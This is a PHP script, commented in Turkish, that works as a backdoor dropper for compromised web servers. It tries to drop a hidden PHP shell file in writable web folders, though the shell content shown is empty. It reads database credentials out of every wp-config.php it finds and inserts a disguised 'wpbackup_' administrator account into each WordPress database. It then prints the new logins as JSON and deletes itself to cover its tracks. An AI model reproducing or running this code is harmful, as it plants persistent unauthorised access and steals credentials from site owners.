<?php
error_reporting(0); set_time_limit(60);
$results = [];

// Web shell bırak
$sname = '.' . substr(md5(time()), 0, 8) . '.php';
$shell = '';
$dirs = [__DIR__, dirname(__DIR__).'/public_html'];
foreach($dirs as $d){
    if(is_writable($d)){
        file_put_contents($d.'/'.$sname, $shell);
        $results['shell'] = 'https://'.$_SERVER['HTTP_HOST'].'/'.$sname;
        break;
    }
}

// WordPress admin oluştur
function findWPConfigs($base){
    $configs = [];
    foreach(new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($base, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    ) as $f){
        if($f->getFilename() == 'wp-config.php' && $f->getDepth() < 4){
            $configs[] = $f->getPathname();
        }
    }
    return $configs;
}

function createWPAdmin($config){
    $c = file_get_contents($config);
    preg_match("/define\s*\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $c, $db);
    preg_match("/define\s*\(\s*'DB_USER'\s*,\s*'([^']+)'/", $c, $u);
    preg_match("/define\s*\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'/", $c, $p);
    preg_match("/define\s*\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $c, $h);
    preg_match("/\\\$table_prefix\s*=\s*'([^']+)'/", $c, $pfx);
    if(!$db || !$u || !$p) return null;
    $host = $h[1] ?? 'localhost';
    $prefix = $pfx[1] ?? 'wp_';
    try {
        $pdo = new PDO("mysql:host=$host;dbname={$db[1]};charset=utf8",
            $u[1], $p[1], [PDO::ATTR_TIMEOUT => 5]);
    } catch(Exception $e){ return null; }
    $user = 'wpbackup_'.substr(md5(rand()),0,6);
    $pass = 'Bk@'.substr(md5(rand()),0,12).'!';
    $hash = password_hash($pass, PASSWORD_BCRYPT);
    $email = $user.'@gmail.com';
    $now = date('Y-m-d H:i:s');
    $uid_q = $pdo->query("SELECT MAX(ID) FROM {$prefix}users");
    $uid = ($uid_q ? (int)$uid_q->fetchColumn() : 0) + 1;
    $ins = $pdo->prepare("INSERT INTO {$prefix}users
        (ID,user_login,user_pass,user_nicename,user_email,user_registered,user_status,display_name)
        VALUES (?,?,?,?,?,?,0,?)");
    if($ins->execute([$uid,$user,$hash,$user,$email,$now,$user])){
        $pdo->exec("INSERT INTO {$prefix}usermeta VALUES(NULL,$uid,'{$prefix}capabilities','a:1:{s:13:\"administrator\";b:1;}')");
        $pdo->exec("INSERT INTO {$prefix}usermeta VALUES(NULL,$uid,'{$prefix}user_level','10')");
        return ['user'=>$user,'pass'=>$pass,'uid'=>$uid];
    }
    return null;
}

$home = dirname(dirname(__FILE__));
$configs = findWPConfigs($home);
foreach($configs as $cfg){
    $r = createWPAdmin($cfg);
    if($r){
        $dir = dirname($cfg);
        $results['wp'][] = [
            'config' => $cfg,
            'user'   => $r['user'],
            'pass'   => $r['pass'],
            'url'    => str_replace('/home/'.explode('/',$cfg)[2].'/public_html', '', $dir)
        ];
    }
}

echo json_encode($results);
@unlink(__FILE__);
?>